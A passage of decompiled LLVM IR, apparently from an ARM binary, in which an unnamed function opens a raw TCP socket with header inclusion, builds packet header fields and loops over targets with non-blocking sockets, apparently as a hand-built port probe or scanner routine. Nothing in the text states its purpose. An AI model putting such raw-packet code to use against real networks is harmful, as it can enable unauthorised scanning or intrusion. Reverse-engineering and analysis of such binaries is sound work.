  uselistorder label %dec_label_pc_9c54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9b90, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9b70, { 1, 0 }
  uselistorder label %dec_label_pc_9b4c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9afc, { 1, 0 }
  uselistorder label %dec_label_pc_9ae0, { 1, 0 }
}

define i32 @function_a070(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a070:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a070 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a08c = call i32 @function_1215c(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a098 = load i32, i32* @r6, align 4
  store i32 %v0_a098, i32* %r0.global-to-local, align 4
  %v2_a09c = call i32 @function_1215c(i32 %v0_a098, i32 4)
  %v0_a0a0 = load i32, i32* @r5, align 4
  store i32 %v0_a0a0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0b0 = load i32, i32* @r4, align 4
  store i32 %v0_a0b0, i32* %r0.global-to-local, align 4
  %v5_a0b4 = inttoptr i32 %v0_a0a0 to i32*
  %v6_a0b4 = call i32 @function_8570(i32 %v0_a0b0, i32* %v5_a0b4, i32 2, i32 0, i32 %v2_a09c)
  %v1_a0c0 = urem i32 %v6_a0b4, 256
  store i32 %v1_a0c0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a0cc = load i32, i32* @r5, align 4
  store i32 %v0_a0cc, i32* %r1.global-to-local, align 4
  %v0_a0d0 = load i32, i32* @r4, align 4
  store i32 %v0_a0d0, i32* %r0.global-to-local, align 4
  %v5_a0d4 = trunc i32 %v6_a0b4 to i8
  %v6_a0d8 = inttoptr i32 %v0_a0cc to i32*
  %v7_a0d8 = call i32 @function_8570(i32 %v0_a0d0, i32* %v6_a0d8, i32 3, i32 65535, i32 %v6_a0b4)
  %v0_a0dc = load i32, i32* @r5, align 4
  store i32 %v0_a0dc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a0d8, i32* @r7, align 4
  %v0_a0ec = load i32, i32* @r4, align 4
  store i32 %v0_a0ec, i32* %r0.global-to-local, align 4
  %v5_a0f0 = inttoptr i32 %v0_a0dc to i32*
  %v6_a0f0 = call i32 @function_8570(i32 %v0_a0ec, i32* %v5_a0f0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a0f8 = urem i32 %v6_a0f0, 256
  store i32 %v1_a0f8, i32* %ip.global-to-local, align 4
  %v0_a0fc = load i32, i32* @r5, align 4
  store i32 %v0_a0fc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a108 = load i32, i32* @r4, align 4
  store i32 %v0_a108, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a0f0, 16777216
  %v5_a110 = sdiv i32 %sext, 16777216
  %v6_a110 = inttoptr i32 %v0_a0fc to i32*
  %v7_a110 = call i32 @function_8570(i32 %v0_a108, i32* %v6_a110, i32 5, i32 1, i32 %v5_a110)
  %v1_a11c = urem i32 %v7_a110, 256
  store i32 %v1_a11c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a124 = load i32, i32* @r5, align 4
  store i32 %v0_a124, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a134 = inttoptr i32 %v0_a124 to i32*
  %v6_a134 = call i32 @function_8570(i32 %v0_a12c, i32* %v5_a134, i32 7, i32 65535, i32 %v1_a11c)
  %v0_a138 = load i32, i32* @r5, align 4
  store i32 %v0_a138, i32* %r1.global-to-local, align 4
  %v3_a13c = mul i32 %v6_a134, 65536
  store i32 %v3_a13c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %v3_a14c = urem i32 %v6_a134, 65536
  store i32 %v3_a14c, i32* @sl, align 4
  %v5_a150 = inttoptr i32 %v0_a138 to i32*
  %v6_a150 = call i32 @function_8570(i32 %v0_a148, i32* %v5_a150, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a158 = urem i32 %v6_a150, 256
  store i32 %v1_a158, i32* %ip.global-to-local, align 4
  %v0_a15c = load i32, i32* @r5, align 4
  store i32 %v0_a15c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a168 = load i32, i32* @r4, align 4
  store i32 %v0_a168, i32* %r0.global-to-local, align 4
  %v5_a170 = inttoptr i32 %v0_a15c to i32*
  %v6_a170 = call i32 @function_8570(i32 %v0_a168, i32* %v5_a170, i32 12, i32 1, i32 %v1_a158)
  %v1_a178 = urem i32 %v6_a170, 256
  store i32 %v1_a178, i32* %ip.global-to-local, align 4
  %v0_a17c = load i32, i32* @r5, align 4
  store i32 %v0_a17c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v5_a190 = inttoptr i32 %v0_a17c to i32*
  %v6_a190 = call i32 @function_8570(i32 %v0_a188, i32* %v5_a190, i32 13, i32 1, i32 %v1_a178)
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @function_8570(i32 %v0_a1a8, i32* %v5_a1b0, i32 14, i32 0, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @function_8570(i32 %v0_a1c8, i32* %v5_a1d0, i32 15, i32 0, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @function_8570(i32 %v0_a1e8, i32* %v5_a1f0, i32 16, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a204 = load i32, i32* @r5, align 4
  store i32 %v0_a204, i32* %r1.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a204 to i32*
  %v6_a210 = call i32 @function_8570(i32 %v0_a208, i32* %v5_a210, i32 0, i32 768, i32 %v1_a1f8)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a220 = load i32, i32* @r5, align 4
  store i32 %v0_a220, i32* %r1.global-to-local, align 4
  %v0_a224 = load i32, i32* @r4, align 4
  store i32 %v0_a224, i32* %r0.global-to-local, align 4
  %v5_a228 = inttoptr i32 %v0_a220 to i32*
  %v6_a228 = call i32 @function_8570(i32 %v0_a224, i32* %v5_a228, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a230 = urem i32 %v6_a228, 256
  store i32 %v1_a230, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a244 = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_a244, i32* %r0.global-to-local, align 4
  %v7_a248 = icmp eq i32 %v3_a244, -1
  store i1 %v7_a248, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a244, i32* @sb, align 4
  br i1 %v7_a248, label %dec_label_pc_a438, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a070
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a25c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a25c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a270 = call i32 @function_115b0(i32 %v3_a244, i32 0, i32 3, i32 %v6_a25c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a270, i32* %r0.global-to-local, align 4
  %v7_a274 = icmp eq i32 %v5_a270, -1
  store i1 %v7_a274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a274, label %dec_label_pc_a430, label %dec_label_pc_a27c

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a254
  %v0_a27c = load i32, i32* @r7, align 4
  %v3_a27c = mul i32 %v0_a27c, 65536
  store i32 %v3_a27c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a284 = load i32, i32* @r6, align 4
  %v2_a284 = icmp eq i32 %v0_a284, 0
  store i1 %v2_a284, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a28c = urem i32 %v0_a27c, 65536
  store i32 %v3_a28c, i32* @fp, align 4
  br i1 %v2_a284, label %dec_label_pc_a6bc, label %dec_label_pc_a294.preheader

dec_label_pc_a294.preheader:                      ; preds = %dec_label_pc_a27c
  %v2_a2e0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a324 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a35c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a368 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a36c = ptrtoint i32* %stack_var_-48 to i32
  %v4_a3cc = zext i8 %tmp to i32
  %v1_a3d0 = and i32 %v4_a3cc, 18
  %v2_a3d4 = icmp eq i32 %v1_a3d0, 18
  %v3_a3b8 = sext i16 %tmp61 to i32
  %v1_a3dc = and i32 %v4_a3cc, 5
  %v2_a3dc = icmp eq i32 %v1_a3dc, 0
  %v4_a31c = add i32 %v2_a2e0, 82
  %v5_a31c = inttoptr i32 %v4_a31c to i16*
  %v1_a50c = add i32 %v6_a210, 40
  %v1_a620 = urem i32 %v6_a150, 2
  %tmp97 = sub nsw i32 0, %v1_a620
  %v4_a628 = and i32 %tmp97, 32
  %v1_a638 = urem i32 %v6_a170, 2
  %tmp98 = sub nsw i32 0, %v1_a638
  %v4_a640 = and i32 %tmp98, 16
  %v1_a650 = urem i32 %v6_a190, 2
  %tmp99 = sub nsw i32 0, %v1_a650
  %v4_a658 = and i32 %tmp99, 8
  %v1_a668 = urem i32 %v6_a1b0, 2
  %tmp100 = sub nsw i32 0, %v1_a668
  %v4_a670 = and i32 %tmp100, 4
  %v1_a680 = urem i32 %v6_a1d0, 2
  %tmp101 = sub nsw i32 0, %v1_a680
  %v3_a688 = and i32 %tmp101, 2
  %v1_a698 = urem i32 %v6_a1f0, 2
  br label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %dec_label_pc_a294.preheader, %dec_label_pc_a408
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a408 ], [ %tmp34, %dec_label_pc_a294.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a408 ], [ %tmp37, %dec_label_pc_a294.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2a0 = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_a2a0, i32* %r0.global-to-local, align 4
  %v7_a2a4 = icmp eq i32 %v3_a2a0, -1
  store i1 %v7_a2a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2a0, i32* @r5, align 4
  br i1 %v7_a2a4, label %dec_label_pc_a408, label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a3e4
  %v0_a2b8 = phi i32 [ %v3_a3f8, %dec_label_pc_a3e4 ], [ %v3_a2a0, %dec_label_pc_a294 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a3e4 ], [ %stack_var_-62.0, %dec_label_pc_a294 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4b8, %dec_label_pc_a3e4 ], [ %stack_var_-60.0, %dec_label_pc_a294 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a2b8 = call i32 @function_10c10(i32 %v0_a2b8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a2c0 = or i32 %v2_a2b8, 2048
  store i32 %v1_a2c0, i32* %r2.global-to-local, align 4
  %v0_a2c4 = load i32, i32* @r5, align 4
  store i32 %v0_a2c4, i32* %r0.global-to-local, align 4
  %v2_a2c8 = call i32 @function_10c10(i32 %v0_a2c4, i32 4)
  %v3_a2cc = load i32, i32* %stack_var_-44, align 4
  %v5_a2d4 = mul i32 %v3_a2cc, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a2e0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a2e8 = add i32 %v5_a2d4, %arg2
  store i32 %v2_a2e8, i32* %r3.global-to-local, align 4
  %v1_a2ec = add i32 %v2_a2e8, 20
  %v2_a2ec = inttoptr i32 %v1_a2ec to i8*
  %v3_a2ec = load i8, i8* %v2_a2ec, align 1
  %v4_a2ec = zext i8 %v3_a2ec to i32
  store i32 %v4_a2ec, i32* %r2.global-to-local, align 4
  %v2_a2f0 = icmp ugt i8 %v3_a2ec, 30
  %v7_a2f0 = icmp eq i8 %v3_a2ec, 31
  store i1 %v7_a2f0, i1* %cpsr_z.global-to-local, align 1
  %v2_a2f4 = xor i1 %v7_a2f0, true
  %v3_a2f4 = and i1 %v2_a2f0, %v2_a2f4
  br i1 %v3_a2f4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2b0
  %v5_a2f4 = add i32 %v2_a2e8, 16
  %v6_a2f4 = inttoptr i32 %v5_a2f4 to i32*
  %v7_a2f4 = load i32, i32* %v6_a2f4, align 4
  store i32 %v7_a2f4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2b0, %bb
  %v4_a2f8 = phi i32 [ %v2_a2e8, %dec_label_pc_a2b0 ], [ %v7_a2f4, %bb ]
  %v4_a2f8.stack_var_-60.1 = select i1 %v3_a2f4, i32 %v4_a2f8, i32 %stack_var_-60.1
  %v2_a2fc = xor i1 %v2_a2f0, true
  %v3_a2fc = or i1 %v7_a2f0, %v2_a2fc
  br i1 %v3_a2fc, label %dec_label_pc_a444, label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %bb71, %dec_label_pc_a444
  %v0_a4b8 = phi i32 [ %v5_a494, %dec_label_pc_a444 ], [ %v4_a2f8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a308 = load i32, i32* @sl, align 4
  %v9_a308 = icmp eq i32 %v0_a308, 65535
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a308, label %dec_label_pc_a4a0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a300
  %v4_a30c = udiv i32 %v0_a308, 256
  %v2_a310 = urem i32 %v0_a308, 256
  store i32 %v2_a310, i32* %r2.global-to-local, align 4
  %v5_a314 = mul nuw nsw i32 %v2_a310, 256
  %v6_a314 = or i32 %v5_a314, %v4_a30c
  store i32 %v6_a314, i32* %r3.global-to-local, align 4
  store i32 %v2_a2e0, i32* %r0.global-to-local, align 4
  %v2_a31c = trunc i32 %v6_a314 to i16
  store i16 %v2_a31c, i16* %v5_a31c, align 2
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %.thread9, %dec_label_pc_a4a0
  %stack_var_-62.2 = phi i16 [ %v1_a4a0, %dec_label_pc_a4a0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a324, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r0.global-to-local, align 4
  %v3_a330 = call i32 @function_113dc(i32 %v0_a32c, i32 %v2_a324, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a338 = call i32 @function_10a5c(i32* null)
  store i32 %v2_a338, i32* %r0.global-to-local, align 4
  store i32 %v2_a338, i32* @r4, align 4
  %v9_a398 = icmp eq i32 %tmp35, %v0_a4b8
  %v4_a3c0 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a398 to i32
  %v9_a3ac = icmp eq i1 %v9_a398, false
  %v9_a3c4 = icmp eq i32 %v3_a3b8, %v4_a3c0
  br label %dec_label_pc_a354

dec_label_pc_a344:                                ; preds = %.thread, %dec_label_pc_a3b4, %dec_label_pc_a3dc, %bb75
  %v2_a344 = call i32 @function_10a5c(i32* null)
  %v0_a348 = load i32, i32* @r4, align 4
  %v2_a348 = sub i32 %v2_a344, %v0_a348
  store i32 %v2_a348, i32* %r0.global-to-local, align 4
  %v7_a34c = icmp eq i32 %v2_a348, 10
  store i1 %v7_a34c, i1* %cpsr_z.global-to-local, align 1
  %v8_a350 = icmp sgt i32 %v2_a348, 10
  br i1 %v8_a350, label %dec_label_pc_a3e4, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a344, %dec_label_pc_a324
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a368, i32* %r1.global-to-local, align 4
  store i32 %v2_a36c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a374 = load i32, i32* @sb, align 4
  store i32 %v0_a374, i32* %r0.global-to-local, align 4
  %v6_a37c = call i32 @function_114fc(i32 %v0_a374, i32 %v2_a368, i32 256, i32 16384, i32 %v2_a35c, i32 %v2_a36c)
  store i32 %v6_a37c, i32* %r2.global-to-local, align 4
  %v7_a384 = icmp eq i32 %v6_a37c, -1
  store i1 %v7_a384, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a384, label %dec_label_pc_a438, label %dec_label_pc_a390

dec_label_pc_a390:                                ; preds = %dec_label_pc_a354
  store i32 %v0_a4b8, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3a4 = icmp eq i32 %v6_a37c, 40
  store i1 %v7_a3a4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_a37c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_a390
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a344

bb75:                                             ; preds = %dec_label_pc_a390
  store i1 %v9_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ac, label %dec_label_pc_a344, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %bb75
  store i32 %v3_a3b8, i32* @lr, align 4
  store i32 %v2_a2e0, i32* @r3, align 4
  store i32 %v4_a3c0, i32* %r2.global-to-local, align 4
  store i1 %v9_a3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3c4, label %dec_label_pc_a3cc, label %dec_label_pc_a344

dec_label_pc_a3cc:                                ; preds = %dec_label_pc_a3b4
  store i32 %v4_a3cc, i32* %r2.global-to-local, align 4
  store i32 %v1_a3d0, i32* @r3, align 4
  store i1 %v2_a3d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a3d4, label %dec_label_pc_a4b0, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3cc
  store i1 %v2_a3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a3dc, label %dec_label_pc_a344, label %dec_label_pc_a3e4

dec_label_pc_a3e4:                                ; preds = %dec_label_pc_a3dc, %dec_label_pc_a344
  %v0_a3e4 = load i32, i32* @r5, align 4
  store i32 %v0_a3e4, i32* %r0.global-to-local, align 4
  %v1_a3e8 = call i32 @function_10ddc(i32 %v0_a3e4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a3f8 = call i32 @function_115f4(i32 2, i32 1, i32 0)
  store i32 %v3_a3f8, i32* %r0.global-to-local, align 4
  %v3_a3fc = icmp eq i32 %v3_a3f8, -1
  %v8_a3fc = icmp eq i32 %v3_a3f8, -1
  store i1 %v8_a3fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a3f8, i32* @r5, align 4
  br i1 %v3_a3fc, label %dec_label_pc_a408, label %dec_label_pc_a2b0

dec_label_pc_a408:                                ; preds = %dec_label_pc_a3e4, %dec_label_pc_a294, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a294 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_a3e4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a294 ], [ %v0_a4b8, %bb82 ], [ %v0_a4b8, %dec_label_pc_a3e4 ]
  %v3_a408 = load i32, i32* %stack_var_-44, align 4
  %v1_a40c = add i32 %v3_a408, 1
  store i32 %v1_a40c, i32* @r3, align 4
  %v1_a410 = load i32, i32* @r6, align 4
  %v9_a410 = icmp eq i32 %v1_a40c, %v1_a410
  store i1 %v9_a410, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a40c, i32* %stack_var_-44, align 4
  %v5_a418 = icmp slt i32 %v1_a40c, %v1_a410
  br i1 %v5_a418, label %dec_label_pc_a294, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a408
  store i32 %v6_a210, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a6cc

dec_label_pc_a430:                                ; preds = %dec_label_pc_a254
  %v0_a430 = load i32, i32* @sb, align 4
  store i32 %v0_a430, i32* %r0.global-to-local, align 4
  %v1_a434 = call i32 @function_10ddc(i32 %v0_a430)
  store i32 %v1_a434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a438

dec_label_pc_a438:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a070, %dec_label_pc_a430
  %v1_a440 = phi i32 [ %v3_a244, %dec_label_pc_a070 ], [ %v1_a434, %dec_label_pc_a430 ], [ 0, %dec_label_pc_a354 ]
  store i32 %v27_a070, i32* %lr.global-to-local, align 4
  ret i32 %v1_a440

dec_label_pc_a444:                                ; preds = %bb71
  %v1_a444 = add i32 %v4_a2f8, 16
  %v2_a444 = inttoptr i32 %v1_a444 to i32*
  %v3_a444 = load i32, i32* %v2_a444, align 4
  store i32 %v3_a444, i32* @r4, align 4
  %v0_a448 = call i32 @function_e0b8()
  store i32 %v0_a448, i32* %r0.global-to-local, align 4
  %v3_a44c = load i32, i32* %stack_var_-44, align 4
  %v5_a454 = mul i32 %v3_a44c, 24
  %v0_a45c = load i32, i32* @r4, align 4
  %v1_a45c = and i32 %v0_a45c, 16711680
  store i32 %v1_a45c, i32* %ip.global-to-local, align 4
  %v3_a460 = udiv i32 %v0_a45c, 16777216
  %v2_a464 = add i32 %v5_a454, %arg2
  store i32 %v2_a464, i32* %r1.global-to-local, align 4
  %v4_a468 = udiv i32 %v1_a45c, 256
  %v5_a468 = or i32 %v4_a468, %v3_a460
  store i32 %v5_a468, i32* %r2.global-to-local, align 4
  %v1_a46c = and i32 %v0_a45c, 65280
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v1_a470 = add i32 %v2_a464, 20
  %v2_a470 = inttoptr i32 %v1_a470 to i8*
  %v3_a470 = load i8, i8* %v2_a470, align 1
  %v4_a470 = zext i8 %v3_a470 to i32
  store i32 %v4_a470, i32* %ip.global-to-local, align 4
  %v5_a478 = call i32 @llvm.bswap.i32(i32 %v0_a45c)
  %v7_a47c = lshr i32 %v0_a448, %v4_a470
  %v8_a47c = add i32 %v7_a47c, %v5_a478
  store i32 %v8_a47c, i32* %r2.global-to-local, align 4
  %v1_a480 = and i32 %v8_a47c, 16711680
  store i32 %v1_a480, i32* %r0.global-to-local, align 4
  %v1_a48c = and i32 %v8_a47c, 65280
  store i32 %v1_a48c, i32* %r1.global-to-local, align 4
  %v5_a494 = call i32 @llvm.bswap.i32(i32 %v8_a47c)
  store i32 %v5_a494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a300

dec_label_pc_a4a0:                                ; preds = %dec_label_pc_a300
  %v0_a4a0 = call i32 @function_e0b8()
  %v1_a4a0 = trunc i32 %v0_a4a0 to i16
  store i32 %v0_a4a0, i32* %r0.global-to-local, align 4
  store i32 %v2_a2e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a324

dec_label_pc_a4b0:                                ; preds = %dec_label_pc_a3cc
  %v3_a4b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4b0, i32* @r4, align 4
  store i32 %v2_a08c, i32* %ip.global-to-local, align 4
  %v5_a4b8 = mul i32 %v3_a4b0, 16
  %v6_a4b8 = add i32 %v5_a4b8, %v2_a08c
  %v7_a4b8 = inttoptr i32 %v6_a4b8 to i32*
  store i32 %v0_a4b8, i32* %v7_a4b8, align 4
  %v0_a4bc = load i32, i32* @r8, align 4
  %v1_a4bc = add i32 %v0_a4bc, 4
  %v2_a4bc = inttoptr i32 %v1_a4bc to i32*
  %v3_a4bc = load i32, i32* %v2_a4bc, align 4
  store i32 %v3_a4bc, i32* %r1.global-to-local, align 4
  %v1_a4c8 = and i32 %v3_a4bc, 65280
  store i32 %v1_a4c8, i32* %r2.global-to-local, align 4
  store i32 %v2_a08c, i32* %r0.global-to-local, align 4
  %v0_a4d8 = load i32, i32* @r4, align 4
  %v3_a4d8 = mul i32 %v0_a4d8, 16
  %v2_a4dc = add i32 %v3_a4d8, %v2_a08c
  store i32 %v2_a4dc, i32* %ip.global-to-local, align 4
  %v5_a4e0 = call i32 @llvm.bswap.i32(i32 %v3_a4bc)
  store i32 %v5_a4e0, i32* %r3.global-to-local, align 4
  %v2_a4e4 = add i32 %v2_a4dc, 4
  %v3_a4e4 = inttoptr i32 %v2_a4e4 to i32*
  store i32 %v5_a4e0, i32* %v3_a4e4, align 4
  %v0_a4e8 = load i32, i32* @r8, align 4
  %v1_a4e8 = add i32 %v0_a4e8, 8
  %v2_a4e8 = inttoptr i32 %v1_a4e8 to i32*
  %v3_a4e8 = load i32, i32* %v2_a4e8, align 4
  store i32 %v3_a4e8, i32* %r1.global-to-local, align 4
  %v1_a4ec = and i32 %v3_a4e8, 16711680
